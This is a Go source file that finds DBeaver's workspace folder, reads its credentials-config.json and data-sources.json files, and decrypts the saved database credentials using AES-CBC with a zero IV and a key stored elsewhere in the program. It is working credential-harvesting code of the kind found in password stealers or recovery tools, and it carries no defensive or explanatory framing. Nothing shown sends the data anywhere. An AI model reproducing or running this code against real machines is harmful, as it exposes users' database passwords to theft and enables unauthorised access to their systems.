package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"encoding/json"
	"os"
	"path/filepath"
)

func getPathPoints() map[string][]string {
	return map[string][]string{
		"chunks": []string{
			"DBeaverData",
			"workspace6",
			"General",
			".dbeaver",
		},
		"files": []string{
			"credentials-config.json",
			"data-sources.json",
		},
	}
}

func getPaths(baseDir string) ([]string, error) {
	points := getPathPoints()
	target := filepath.Join(append([]string{baseDir}, points["chunks"]...)...)

	var pair []string
	for _, file := range points["files"] {
		item := filepath.Join(target, file)
		if _, err := os.Stat(item); os.IsNotExist(err) {
			return nil, err
		}
		pair = append(pair, item)
	}

	return pair, nil
}

func getDBases(file string) (*datas, error) {
	raw, err := os.ReadFile(file)
	if err != nil {
		return nil, err
	}

	var res datas
	if err := json.Unmarshal(raw, &res); err != nil {
		return nil, err
	}

	return &res, nil
}

func decryptCredentials(file string) (map[string]creds, error) {
	key, err := hex.DecodeString(keyer)
	if err != nil {
		return nil, err
	}

	sz := aes.BlockSize
	iv := make([]byte, sz)

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	raw, err := os.ReadFile(file)
	if err != nil {
		return nil, err
	}

	dec := make([]byte, len(raw))
	mode.CryptBlocks(dec, raw)
	dec = truncBytes(dec, sz)

	var res map[string]creds
	if err := json.Unmarshal(dec, &res); err != nil {
		return nil, err
	}

	return res, nil
}
